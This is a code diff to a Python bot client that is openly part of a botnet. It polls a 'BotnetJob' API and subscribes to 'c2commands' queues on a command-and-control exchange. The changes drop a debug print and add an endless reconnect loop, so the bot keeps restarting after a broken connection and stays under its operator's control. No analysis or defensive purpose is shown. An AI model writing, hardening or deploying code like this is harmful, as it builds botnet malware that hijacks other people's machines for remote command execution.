@@ -31,7 +31,6 @@ class Client():
 
     def init_check_for_jobs(self):
         url = "http://" + self.botnetjobs_address + "/api/v1/BotnetJob/" + str(self.botnet_id)
-        print(url)
         bot_data = None
 
         while True:
@@ -60,12 +59,6 @@ class Client():
 
 
     def listen_for_commands(self):
-        while True:
-            try:
-                self.init_check_for_jobs()
-                break
-            except:
-                print("[-] No connection to jobs service")
         queue_name = "c2commands" + str(self.bot_id)
         exchange_name = "C2Commands" + str(self.botnet_id)
         channel = self.connection.channel()
@@ -165,6 +158,12 @@ class Client():
 
 
 if __name__ == "__main__":
-    client = Client()
-    client.listen_for_commands()
+    while True:
+        try:
+            client = Client()
+            client.listen_for_commands()
+            break
+        except:
+            print("[-] The connection broke. Restarting in 10 seconds...")
+            time.sleep(10)
 
